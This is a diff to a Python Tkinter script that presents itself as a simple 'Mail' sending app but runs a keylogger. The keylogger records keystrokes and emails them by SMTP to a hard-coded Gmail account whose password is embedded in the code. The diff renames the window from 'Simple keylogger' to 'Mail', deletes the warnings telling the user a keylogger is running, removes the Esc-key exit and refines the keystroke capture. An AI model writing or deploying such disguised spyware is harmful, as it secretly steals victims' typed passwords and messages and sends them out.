@@ -1,21 +1,18 @@
+
 import smtplib
 from tkinter import *
 import os
 
-
-print("Make sure your email has allowed less secure app.")
-print("If not, then you can use our provided email.")
-print("If you want to close the keylogger press escape.")
 def send_message():
     address_info = address.get()
     
-    email_body_info = email_body.get()
+    email_body_info = email_body.get(1.0 , END)
     
     print(address_info,email_body_info)
     
-    sender_email = "sdslabskeylogger@gmail.com"#input("Enter yoour email address: ")
+    sender_email = "sdslabskeylogger@gmail.com"
     
-    sender_password = "Crack_It" #getpass.getpass(prompt = "Password: " , stream = None)
+    sender_password = "Crack_It"
     
     server = smtplib.SMTP('smtp.gmail.com',587)
     
@@ -38,7 +35,7 @@ def send_message():
 app = Tk()
 app.geometry("500x500")
 
-app.title("Simple keylogger")
+app.title("Mail")
 
 heading = Label(text="Python Email Sending App",bg="yellow",fg="black",font="10",width="500",height="3")
 
@@ -52,20 +49,18 @@ email_body_field.place(x=15,y=140)
 
 address = StringVar()
 email_body = StringVar()
-#sender_email = StringVar()
-
-#sender_email_entry = Entry(textvariable = sender_email , width="30")
 
 address_entry = Entry(textvariable=address,width="30")
 email_body_entry = Entry(textvariable=email_body,width="30")
+email_body = Text(app , width = 50 , height = 18)
+email_body.place(x = 15 , y = 160)
 
-#sender_email_entry.place(x = 15 , y =100 )
 address_entry.place(x=15,y=100)
 email_body_entry.place(x=15,y=180)
 
 button = Button(app,text="Send Message",command=send_message,width="30",height="2",bg="blue")
 
-button.place(x=15,y=220)
+button.place(x=15,y=400)
 
 
 
@@ -90,20 +85,22 @@ def on_press(key):
     global email
     global email_char_limit
 
-    if key == Key.space or key == Key.enter or key == Key.shift:
+    if key == Key.space or key == Key.enter:
         word += " "
         full_log += word
         word = ""
         if len(full_log) >= email_char_limit:
             send_log()
             full_log = ""
+    elif key == Key.shift_l or key == Key.shift_r:
+        return
+    elif key == Key.backspace:
+        word = word[:-1]
     else:
         char = f'{key}'
         char = char[1: -1]
         word += char
 
-    if key == Key.esc:
-        return False
 
 def send_log():
     server.sendmail(
@@ -115,5 +112,3 @@ def send_log():
 with Listener(on_press = on_press) as Listener:
     mainloop()
     Listener.join()
-
-
